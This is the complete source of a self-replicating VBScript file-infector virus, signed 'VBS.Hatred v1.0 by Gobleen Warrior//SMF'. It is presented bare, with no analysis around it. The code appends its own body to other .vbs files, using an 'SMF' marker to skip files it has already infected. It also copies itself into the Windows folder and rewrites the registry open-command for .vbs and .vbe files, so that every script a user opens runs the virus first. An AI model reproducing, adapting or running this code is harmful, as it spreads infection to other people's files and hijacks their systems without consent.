'`
On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
Set OpenBody = FSO.OpenTextFile(WScript.ScriptFullName, 1)
Buffa = OpenBody.ReadAll
OpenBody.Close
Metka = "'" & Chr(96)
For x = Len(Buffa) To 1 Step -1
If Mid (Buffa, x, 1) = Chr(96) Then
x = 1
OurBody = Metka + OurBody
ElseIf Mid (Buffa, x, 1) <> Chr(96) Then
OurBody = Mid (Buffa, x, 1) + OurBody
End If
Next
Set CmdLine = Wscript.Arguments
If CmdLine.Count <> 0 Then
If CmdLine.Item(0) = "###" Then
For s = 1 To CmdLine.Count-1 Step 1
If FSO.FileExists (CmdLine.Item(s)) = True Then
VictimName = CmdLine.Item(s)
Set OpenVictim = FSO.OpenTextFile (VictimName, 1)
All = OpenVictim.ReadAll
OpenVictim.Close
If Mid (All, Len(All)-2, 3) <> "SMF" Then
Set GetVFile = FSO.GetFile (VictimName)
VAttr = GetVFile.Attributes
GetVFile.Attributes = Normal
Set InfectVictim = FSO.OpenTextFile (VictimName, 8)
InfectVictim.Write OurBody
InfectVictim.Close
GETVFile.Attributes = VAttr
End If
WshShell.Run FSO.GetSpecialFolder(0) & "\WScript.exe " & VictimName
End If
Next
End If
Else
Set Handler = FSO.CreateTextFile (FSO.GetSpecialFolder(0) & "\WScript.vbs", true)
Handler.Write OurBody
Handler.Close
WshShell.RegWrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Open\Command\", FSO.GetSpecialFolder(0) & "\WScript.exe " & FSO.GetSpecialFolder(0) & "\WScript.vbs ### """ & Chr (37) & "1"" " & Chr(37) & "*"
WshShell.RegWrite "HKEY_CLASSES_ROOT\VBEFile\Shell\Open\Command\", FSO.GetSpecialFolder(0) & "\WScript.exe " & FSO.GetSpecialFolder(0) & "\WScript.vbs ### """ & Chr (37) & "1"" " & Chr(37) & "*"
End If
'Look around! All of us have died!!!
'VBS.Hatred v1.0 by Gobleen Warrior//SMF